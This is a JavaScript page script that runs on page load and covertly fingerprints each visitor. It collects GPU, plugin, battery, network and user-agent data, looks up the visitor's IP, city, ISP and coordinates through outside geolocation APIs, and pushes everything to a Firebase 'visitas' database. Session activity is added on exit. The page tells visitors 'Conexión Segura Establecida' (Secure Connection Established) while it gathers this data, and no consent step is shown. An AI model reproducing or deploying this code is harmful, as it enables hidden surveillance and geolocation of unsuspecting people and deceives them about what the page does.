import { db, ref, push } from "./firebase.js";

const ENDPOINT_FIREBASE_REST = "https://fir-90ac4-default-rtdb.firebaseio.com/visitas";

const getGpuInfo = () => {
    try {
        const canvas = document.createElement("canvas");
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
        if (!gl) return { vendor: "N/A", renderer: "N/A" };
        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        return debugInfo ? {
            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
        } : { vendor: "N/A", renderer: "N/A" };
    } catch {
        return { vendor: "Error", renderer: "Error" };
    }
};

const getPluginsInfo = () => {
    try {
        return Array.from(navigator.plugins).map(p => p.name).join(", ") || "Ninguno";
    } catch {
        return "N/A";
    }
};

const getBatteryData = async () => {
    try {
        if (!("getBattery" in navigator)) return { level: "N/A", charging: "N/A", chargingTime: "N/A", dischargingTime: "N/A" };
        const b = await navigator.getBattery();
        return {
            level: b.level * 100,
            charging: b.charging,
            chargingTime: b.chargingTime,
            dischargingTime: b.dischargingTime
        };
    } catch {
        return { level: "Error", charging: "Error", chargingTime: "Error", dischargingTime: "Error" };
    }
};

const getNetworkData = async () => {
    try {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (!conn) return { effectiveType: "N/A", downlink: "N/A", rtt: "N/A", saveData: "N/A" };
        return {
            effectiveType: conn.effectiveType || "N/A",
            downlink: conn.downlink || "N/A",
            rtt: conn.rtt || "N/A",
            saveData: conn.saveData || false
        };
    } catch {
        return { effectiveType: "Error", downlink: "Error", rtt: "Error", saveData: "Error" };
    }
};

const getUaData = async () => {
    try {
        if (!navigator.userAgentData) return { platform: navigator.platform, architecture: "N/A", bitness: "N/A", brands: "N/A" };
        const ua = await navigator.userAgentData.getHighEntropyValues(["architecture", "bitness", "model", "platform", "platformVersion", "fullVersionList"]);
        return {
            platform: ua.platform || "N/A",
            architecture: ua.architecture || "N/A",
            bitness: ua.bitness || "N/A",
            brands: ua.fullVersionList ? ua.fullVersionList.map(b => `${b.brand} ${b.version}`).join(", ") : "N/A"
        };
    } catch {
        return { platform: "Error", architecture: "Error", bitness: "Error", brands: "Error" };
    }
};

const getIpAndGeoData = async () => {
    try {
        const ipRes = await fetch("https://api.ipify.org?format=json", { signal: AbortSignal.timeout(3000) });
        if (!ipRes.ok) throw new Error();
        const { ip } = await ipRes.json();
        
        const geoRes = await fetch(`https://ipapi.co/${ip}/json/`, { signal: AbortSignal.timeout(3000) });
        if (!geoRes.ok) throw new Error();
        const geo = await geoRes.json();
        
        return {
            ip,
            country: geo.country_name || "N/A",
            region: geo.region || "N/A",
            city: geo.city || "N/A",
            isp: geo.org || "N/A",
            latitude: geo.latitude || "N/A",
            longitude: geo.longitude || "N/A"
        };
    } catch {
        return { ip: "Fallida", country: "N/A", region: "N/A", city: "N/A", isp: "N/A", latitude: "N/A", longitude: "N/A" };
    }
};

const gatherClientTelemetry = async () => {
    const timestampIso = new Date().toISOString();
    
    const staticData = {
        hardware: {
            cores: navigator.hardwareConcurrency || "N/A",
            ramGb: navigator.deviceMemory || "N/A"
        },
        display: {
            colorDepth: window.screen.colorDepth || "N/A",
            pixelDepth: window.screen.pixelDepth || "N/A",
            devicePixelRatio: window.devicePixelRatio || "N/A",
            orientation: window.screen.orientation ? window.screen.orientation.type : "N/A",
            maxTouchPoints: navigator.maxTouchPoints || 0,
            isFullscreen: document.fullscreenElement !== null,
            screenWidth: window.screen.width,
            screenHeight: window.screen.height,
            innerWidth: window.innerWidth,
            innerHeight: window.innerHeight
        },
        software: {
            languages: navigator.languages ? navigator.languages.join(", ") : navigator.language,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack === "1" || navigator.doNotTrack === "yes",
            plugins: getPluginsInfo()
        },
        gpu: getGpuInfo()
    };

    const [battery, network, uaData, geoData] = await Promise.all([
        getBatteryData(),
        getNetworkData(),
        getUaData(),
        getIpAndGeoData()
    ]);

    return {
        timestampIso,
        ...staticData,
        battery,
        network,
        environment: uaData,
        location: geoData,
        session: {
            totalSeconds: 0,
            activeSeconds: 0,
            inactiveSeconds: 0,
            eventsFired: 0
        }
    };
};

let activeTime = 0;
let inactiveTime = 0;
let lastTick = Date.now();
let lastActivityTime = Date.now();
let isUserActive = !document.hidden;
let eventCounter = 0;
let recordKey = null;

const updateActivityState = () => {
    isUserActive = true;
    lastActivityTime = Date.now();
    eventCounter++;
};

const setupActivityListeners = () => {
    const options = { passive: true };
    ['mousemove', 'keydown', 'scroll', 'touchstart', 'click'].forEach(evt => {
        window.addEventListener(evt, updateActivityState, options);
    });
    
    document.addEventListener("visibilitychange", () => {
        if (!document.hidden) updateActivityState();
    });
};

const updateTimers = () => {
    const now = Date.now();
    const delta = (now - lastTick) / 1000;
    
    if (document.hidden || (now - lastActivityTime > 8000)) {
        isUserActive = false;
    }
    
    if (isUserActive) {
        activeTime += delta;
    } else {
        inactiveTime += delta;
    }
    lastTick = now;
};

const updateUiState = (state) => {
    const box = document.getElementById("ui-box");
    const msg = document.getElementById("status-message");
    const spinner = document.getElementById("spinner");
    const icon = document.getElementById("status-icon");

    box.className = `content-box ${state}`;
    spinner.style.display = "none";
    icon.style.display = "block";

    if (state === "success") {
        msg.textContent = "Conexión Segura Establecida";
        icon.textContent = "✔️";
    } else {
        msg.textContent = "Error de Inicialización";
        icon.textContent = "❌";
    }
};

const initializeSystem = async () => {
    try {
        const telemetryPayload = await gatherClientTelemetry();
        const visitsRef = ref(db, "visitas");
        const newVisit = await push(visitsRef, telemetryPayload);
        recordKey = newVisit.key;
        
        setupActivityListeners();
        setInterval(updateTimers, 1000);
        updateUiState("success");
    } catch (error) {
        updateUiState("error");
    }
};

window.addEventListener("beforeunload", () => {
    if (!recordKey) return;
    
    updateTimers();
    const exitData = {
        session: {
            totalSeconds: parseFloat((activeTime + inactiveTime).toFixed(2)),
            activeSeconds: parseFloat(activeTime.toFixed(2)),
            inactiveSeconds: parseFloat(inactiveTime.toFixed(2)),
            eventsFired: eventCounter
        },
        exitTimeIso: new Date().toISOString()
    };

    const url = `${ENDPOINT_FIREBASE_REST}/${recordKey}.json`;
    
    try {
        fetch(url, {
            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(exitData),
            keepalive: true
        });
    } catch (e) {}
});

document.addEventListener("DOMContentLoaded", initializeSystem);